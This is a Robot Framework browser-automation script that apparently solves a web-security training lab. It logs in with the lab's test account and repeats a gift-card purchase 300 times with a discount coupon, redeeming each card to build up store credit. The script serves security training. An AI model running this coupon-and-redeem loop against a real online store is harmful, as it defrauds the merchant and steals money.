*** Settings ***
Library  SeleniumLibrary


*** Variables ***
${BROWSER}  chrome
${LOGIN URL}   https://ac5e1f531f2eab21800d6065003a0082.web-security-academy.net/ 

*** Keywords ***

open page
    Open Browser    ${LOGIN URL}    ${BROWSER}

login
    click element  //a[contains(text(),'Login')]

    input text  //body/div[1]/section[1]/div[1]/section[1]/form[1]/input[2]  wiener
    input text  //body/div[1]/section[1]/div[1]/section[1]/form[1]/input[3]  peter
    click element  //button[contains(text(),'Log in')]

buy gift card
    click element  //body/div[1]/section[1]/div[1]/section[2]/div[2]/a[1]
    click element  //button[contains(text(),'Add to cart')]
    click element  //header/section[1]/a[4]
    input text  //body/div[1]/section[1]/div[1]/form[1]/input[2]  SIGNUP30
    click element  //button[contains(text(),'Apply')] 
    click element  //button[contains(text(),'Place order')] 
    ${codigo}  get text  //th[contains(text(),'Code')]//following::td[1]
    click element  //a[contains(text(),'My account')] 
    input text  //body/div[1]/section[1]/div[1]/div[1]/form[2]/input[2]  ${codigo}
    click element  //button[contains(text(),'Redeem')]
    click element  //a[contains(text(),'Home')]
       
*** Test Cases ***

play automation
   open page
   login
   FOR  ${i}  IN RANGE  300
       buy gift card
    END